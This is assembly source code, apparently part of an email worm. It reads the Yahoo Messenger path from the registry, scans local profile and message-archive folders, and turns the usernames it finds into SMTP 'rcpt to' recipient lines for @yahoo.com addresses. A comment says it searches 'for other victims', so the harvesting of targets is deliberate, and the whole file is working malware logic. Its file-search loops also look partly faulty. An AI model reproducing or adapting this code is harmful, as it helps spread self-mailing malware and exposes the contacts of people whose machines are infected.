include email_accesory.asm

.code
find_email proc
call email_extracting
.if eax==0
call EnableArchive
mov eax,0
.endif

ret
find_email endp


.code


email_extracting proc
.data

extend1 db "Messenger\Profiles",0
extend2 db "Archive\Messages",0
extend3 db "@yahoo.com",0
extend4 db ">",13,10,0
append1 db "rcpt to:<",0

keyname1 db "software\Yahoo\Skin",0
valuename1 db "Path",0 
ext_here db "*.*",0
sz_buffer dd 512

byte_size dd 4096
dotdot db "..",0
.data?
email_buffer db 512 dup(?)
mailfrom db 512 dup(?)

;reg_handle dd ?
wsd WIN32_FIND_DATA<?>
find_handle1 dd ?
find_handle2 dd ?

;icei INTERNET_CACHE_ENTRY_INFO<?>

.code
invoke RtlZeroMemory,offset email_buffer,512
invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,offset keyname1,0,KEY_QUERY_VALUE,offset reg_handle
cmp eax,0
jne exit_mail_extracting
invoke RegQueryValueEx,reg_handle,addr valuename1,0,0,offset email_buffer,addr sz_buffer
invoke RegCloseKey,reg_handle

invoke SetCurrentDirectory,offset email_buffer
invoke SetCurrentDirectory,offset dotdot
invoke SetCurrentDirectory,offset dotdot
invoke SetCurrentDirectory,offset extend1
invoke FindFirstFile,offset ext_here,offset wsd
mov find_handle1,eax
return_1:
invoke FindNextFile,eax,offset wsd
invoke FindNextFile,find_handle1,offset wsd

.if wsd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY
invoke SetCurrentDirectory,offset wsd.cFileName
invoke RtlZeroMemory,offset mailfrom,512
invoke lstrcpy,offset mailfrom,offset wsd.cFileName
invoke SetCurrentDirectory,offset extend2

invoke FindFirstFile,offset ext_here,offset wsd
mov find_handle2,eax


invoke FindNextFile,find_handle2,offset wsd
invoke FindNextFile,find_handle2,offset wsd
cmp eax,0
je return_1
invoke RtlZeroMemory,offset email_buffer,512
invoke RtlZeroMemory,offset email_address,512
invoke lstrcat,offset email_buffer,offset wsd.cFileName
invoke lstrcat,offset email_address,offset append1
invoke lstrcat,offset email_address,offset wsd.cFileName
invoke lstrcat,offset email_address,offset extend3
invoke lstrcat,offset email_address,offset extend4




;invoke CloseHandle,find_handle2
.endif
invoke CloseHandle,find_handle1

mov eax,offset email_address
cmp word ptr [eax],0
je exit_mail_extracting

ret
exit_mail_extracting:
.data
error_me db "There was error in email extracting",0
.code
invoke MessageBox,0,offset error_me,offset error_me,0
mov eax,0
ret
email_extracting endp
gimbo proc  ;for ultimate searching for other victims :)

invoke FindNextFile,find_handle2,offset wsd

cmp eax,0
je end_1
invoke RtlZeroMemory,offset email_buffer,512
invoke RtlZeroMemory,offset email_address,512
invoke lstrcat,offset email_buffer,offset wsd.cFileName
invoke lstrcat,offset email_address,offset append1
invoke lstrcat,offset email_address,offset wsd.cFileName
invoke lstrcat,offset email_address,offset extend3
invoke lstrcat,offset email_address,offset extend4




invoke CloseHandle,find_handle2
ret
end_1:
mov eax,1

ret
gimbo endp